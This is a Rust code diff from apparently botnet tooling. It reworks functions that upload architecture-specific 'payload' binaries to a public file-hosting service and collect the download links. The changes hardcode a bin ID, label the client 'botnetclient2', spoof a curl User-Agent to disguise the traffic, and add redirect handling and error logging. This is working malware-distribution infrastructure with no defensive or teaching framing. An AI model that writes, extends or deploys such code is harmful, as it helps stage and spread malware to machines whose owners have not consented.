@@ -38,11 +38,13 @@ async fn upload_payload(
     architecture: &str,
     data: Bytes,
 ) -> Result<response::FilebinResponse, ()> {
-    let bin = generate_bin().await;
+    // let bin = generate_bin().await;
+    let bin = "im76vQIH";
 
     let mut headers = HeaderMap::new();
     headers.insert("accept", HeaderValue::from_static("application/json"));
-    headers.insert("cid", HeaderValue::from_static("botnetclient")); // Id isn't important i guess
+    headers.insert("cid", HeaderValue::from_static("botnetclient2")); // Id isn't important i guess
+    headers.insert("User-Agent", HeaderValue::from_static("curl/7.68.0")); // Set User-Agent to mimic curl
     headers.insert(
         CONTENT_TYPE,
         HeaderValue::from_static("application/octet-stream"),
@@ -51,6 +53,8 @@ async fn upload_payload(
     let filename = format!("payload-{}", architecture);
     let url = format!("{}/{}/{}", FILEDUMP, bin, filename);
 
+    println!("[+] Creating file dump link {}", url);
+
     // Upload file
     let response = client
         .post(url)
@@ -58,16 +62,25 @@ async fn upload_payload(
         .body(data)
         .send()
         .await
-        .map_err(|_| ())?
+        .map_err(|e| {
+            println!("[-] Error uploading payload: {:?}", e);
+            ()
+        })?;
+    println!("[+] Respononse: {:?}", response);
+    let response_json = response
         .json::<response::FilebinResponse>()
         .await
-        .map_err(|_| ())?;
+        .map_err(|e| {
+            println!("[-] Error getting json: {:?}", e);
+            ()
+        })?;
 
-    // lock bin
-    let url = format!("{}/{}", FILEDUMP, bin);
-    let _ = client.put(url).send().await.map_err(|_| ())?;
+    // lock bin (we upload to the same bin)
+    // let url = format!("{}/{}", FILEDUMP, bin);
+    // println!("Locking bin {}", url);
+    // let _ = client.put(url).send().await.map_err(|_| ())?;
 
-    Ok(response)
+    Ok(response_json)
 }
 
 async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes, ()> {
@@ -83,7 +96,10 @@ async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes,
 }
 
 async fn run() -> Result<()> {
-    let client = RClient::new();
+    let client = RClient::builder()
+        .redirect(reqwest::redirect::Policy::limited(10))
+        .build()
+        .unwrap();
 
     let mut payloads: HashMap<String, Bytes> = HashMap::new();
 
@@ -118,11 +134,16 @@ async fn run() -> Result<()> {
                 filebin_urls.insert(architecture, link.clone());
                 println!("[+] Created file dump link {}", link);
             }
-            Err(_) => println!(
-                "[-] Error uploading to filedump for architecture {}",
-                architecture
+            Err(e) => println!(
+                "[-] Error uploading to filedump for architecture {}: {:?}",
+                architecture, e
             ),
         }
+    }
+
+    if filebin_urls.len() == 0 {
+        println!("[i] No filebin urls, stopping...");
+        exit(-1);
     }
 
     let serialized = serde_json::to_string(&filebin_urls).unwrap();
